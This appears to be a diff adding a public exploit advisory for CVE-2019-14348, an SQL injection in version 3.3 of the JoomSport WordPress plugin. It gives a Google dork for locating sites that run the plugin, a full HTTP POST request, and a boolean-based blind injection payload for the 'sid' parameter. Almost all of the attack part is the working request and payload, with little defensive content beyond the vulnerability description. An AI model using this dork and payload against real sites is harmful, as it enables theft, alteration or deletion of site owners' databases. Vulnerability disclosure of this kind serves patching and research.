@@ -1,0 +1,46 @@
+# Exploit Title: JoomSport 3.3 – for Sports - SQL injection
+# Google Dork: intext:powered by JoomSport - sport WordPress plugin
+# Date:29/07/2019.
+# Exploit Author: Pablo Santiago
+# Vendor Homepage: https://beardev.com/
+# Software Link: https://wordpress.org/plugins/joomsport-sports-league-results-management/
+# Version: 3.3
+# Tested on: Windows and Kali linux
+# CVE :2019-14348
+# References: https://hackpuntes.com/cve-2019-14348-joomsport-for-sports-sql-injection/
+
+# 1. Technical Description:
+#Through the SQL injection vulnerability, a malicious user could
+inject SQL code in order to steal information from the database,
+modify data from the database, even delete database or data from
+them.
+
+#2.  Request: All requests that contains the parameter sid are
+vulnerables to SQL injection
+
+POST /wordpress/joomsport_season/new-yorkers/?action=playerlist HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0)
+Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/wordpress/joomsport_season/new-yorkers/?action=playerlist
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=s010flbg7fbohnguabsvjaut40
+Upgrade-Insecure-Requests: 1
+
+sid=1&page=1&jscurtab=
+
+# 3. Payload:
+
+Parameter: sid (POST)
+   Type: boolean-based blind
+   Title:  Or boolean-based blind - WHERE or HAVING clause
+   Payload: sid=-3506 OR 7339=7339&page=1jscurtab=
+
+# 4. Reference:
+# https://hackpuntes.com/cve-2019-14348-joomsport-for-sports-sql-injection/
